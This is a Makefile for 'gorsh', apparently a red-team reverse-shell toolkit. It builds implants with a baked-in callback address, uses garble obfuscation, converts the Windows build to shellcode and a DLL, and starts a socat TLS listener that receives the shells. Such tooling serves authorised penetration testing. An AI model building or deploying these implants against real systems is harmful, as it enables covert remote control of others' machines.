APP = gorsh
OUT = build

SRV_KEY = certs/server.key
SRV_PEM = certs/server.pem
PKEY = internal/sshocks/conf/id_ed25519

BUILD = go build -trimpath

PLATFORMS = linux windows darwin
target = $(word 1, $@)

LHOST ?= 127.0.0.1
LPORT ?= 8443

FINGERPRINT = $(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
LDFLAGS = "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"

# Only set mingw on Linux
ifeq ($(OS),Windows_NT)
	CC=$(shell go env CC)
else
	ifeq ($(OS),Darwin)
		CC=$(shell go env CC)
	endif
	CC=x86_64-w64-mingw32-gcc
endif

GARBLE = ${GOPATH}/bin/garble
GODONUT = ${GOPATH}/bin/go-donut
SOCAT = /usr/bin/socat

# zStd is a highly efficient compression library that requires CGO compilation.
# If you'd like to turn this feature on and have experience cross-compiling 
# with cgo, enable the feature by uncommenting the following 3 lines
# (macos not supported)
# ENV.windows = CGO_ENABLED=1 CC=${CC}
# ZSTD.windows = -tags zstd
# ZSTD.linux = -tags zstd

.PHONY: all
all: $(PLATFORMS) server shellcode dll

.PHONY: $(PLATFORMS)
${PLATFORMS}: $(SRV_KEY) $(GARBLE)
	${ENV.${target}} \
	GOOS=${target} ${BUILD} \
		-buildmode pie \
		-ldflags ${LDFLAGS} \
		${ZSTD.${target}} \
		-o ${OUT}/${APP}.${target} \
		cmd/gorsh/main.go

.PHONY: listen listen-socat
listen listen-socat: $(SRV_KEY) $(SOCAT)
	@test -n "$(PORT)" || (echo "PORT not defined"; exit 1)
	${SOCAT} -d \
		OPENSSL-LISTEN:${PORT},fork,key=${SRV_KEY},cert=${SRV_PEM},reuseaddr,verify=0 \
		EXEC:scripts/${target}.sh

.PHONY: server
server:
	GOOS=linux ${BUILD} \
		-buildmode pie \
		-ldflags ${LDFLAGS} \
		-o ${OUT}/srv/gorsh-server \
		cmd/gorsh-server/main.go

.PHONY: shellcode
shellcode: $(GODONUT) windows
	${GODONUT} --arch x64 --verbose \
		--in ${OUT}/${APP}.windows \
		--out ${OUT}/${APP}.windows.bin 

.PHONY: dll
dll:
	CGO_ENABLED=1 CC=${CC} \
	GOOS=windows ${BUILD} \
		-buildmode=c-shared \
		-trimpath \
		${ZSTD.windows} \
		-ldflags ${LDFLAGS} \
		-o ${OUT}/${APP}.windows.dll \
		cmd/gorsh-dll/dllmain.go

.PHONY: clean
clean:
	rm -rf ${OUT} ${PKEY}* certs/*


## Dependency Management

$(GODONUT):
	go get github.com/Binject/go-donut

$(GARBLE):
	go install mvdan.cc/garble@latest

$(SOCAT):
	sudo apt get install socat

$(SRV_KEY) $(SRV_PEM) &:
	openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
	@cat ${SRV_KEY} >> ${SRV_PEM}
